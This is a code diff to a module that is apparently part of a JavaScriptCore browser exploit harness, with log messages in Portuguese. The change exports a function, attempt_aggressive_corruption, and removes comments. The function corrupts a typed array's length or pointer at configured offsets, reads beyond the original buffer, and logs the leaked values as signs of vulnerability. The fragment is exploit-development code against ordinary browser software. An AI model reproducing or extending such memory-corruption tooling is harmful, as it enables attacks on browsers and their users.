@@ -7,7 +7,8 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-async function attempt_aggressive_corruption(test_name, offset_to_corrupt, value_to_write, bytes_to_write, is_size_corruption) {
+// Certifique-se que esta função está EXPORTADA
+export async function attempt_aggressive_corruption(test_name, offset_to_corrupt, value_to_write, bytes_to_write, is_size_corruption) {
     const FNAME_TEST = `attempt_aggressive_corruption<${test_name}>`;
     logS3(`--- Iniciando Teste Agressivo: ${test_name} ---`, "test", FNAME_TEST);
     logS3(`    Alvo Offset: ${toHex(offset_to_corrupt)}, Valor: ${typeof value_to_write === 'object' ? value_to_write.toString(true) : toHex(value_to_write)}, Bytes: ${bytes_to_write}`, "info", FNAME_TEST);
@@ -52,7 +53,7 @@ async function attempt_aggressive_corruption(test_name, offset_to_corrupt, value
             logS3("   Teste de Corrupção de TAMANHO:", "info", FNAME_TEST);
             if (u32_array.length * 4 > initial_byte_length) {
                 logS3(`    !!! SUCESSO ESPECULATIVO: Tamanho percebido pelo Uint32Array (${u32_array.length * 4}b) > original (${initial_byte_length}b) !!!`, "vuln", FNAME_TEST);
-                const oob_idx = (initial_byte_length / 4); // Primeiro índice além do original
+                const oob_idx = (initial_byte_length / 4); 
                 logS3(`    Tentando ler u32_array[${toHex(oob_idx)}] (além do limite original)...`, "warn", FNAME_TEST);
                 let val = u32_array[oob_idx];
                 logS3(`    Valor lido de u32_array[${toHex(oob_idx)}]: ${toHex(val)}`, "leak", FNAME_TEST);
@@ -75,7 +76,7 @@ async function attempt_aggressive_corruption(test_name, offset_to_corrupt, value
             let val = u32_array[0];
             logS3(`    Valor lido de u32_array[0]: ${toHex(val)}`, "leak", FNAME_TEST);
             if (value_to_write instanceof AdvancedInt64 && value_to_write.low() === 0 && value_to_write.high() === 0) {
-                if (val === 0) { // Esperado se o ponteiro nulo ler de uma região zerada (ou a leitura falhar graciosamente para 0)
+                if (val === 0) { 
                     logS3("      Leitura de 0 após anular ponteiro (pode ser fallback, não necessariamente sucesso).", "warn", FNAME_TEST);
                 } else {
                      logS3("      Leitura INESPERADA após anular ponteiro.", "vuln", FNAME_TEST);
